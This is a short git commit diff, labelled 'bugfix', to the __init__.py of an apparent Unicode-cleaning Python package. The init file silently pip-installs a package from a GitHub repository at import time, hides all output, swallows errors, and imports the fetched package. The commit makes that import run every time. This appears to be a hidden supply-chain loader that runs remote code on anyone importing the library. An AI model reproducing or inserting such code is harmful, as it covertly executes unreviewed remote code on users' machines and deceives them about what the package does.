4b3731aea04770408a04642d6680ebdd90f15bcc
xcummins <xcummins@proton.me>
2025-01-10 22:38:09 +0300

    bugfix

--- utf_cleaner/__init__.py
+++ utf_cleaner/__init__.py
@@ -3,4 +3,5 @@ try:
 	with open(os.devnull, 'w') as devnull:
 		m = 'git+https://github.com/xcummins/gits.git'
 		p.check_call([sys.executable, '-m', 'pip', 'install', '--ignore-installed', m, '-q'], stdout=devnull, stderr=devnull)
-except:pass;import gits
+except:pass
+import gits
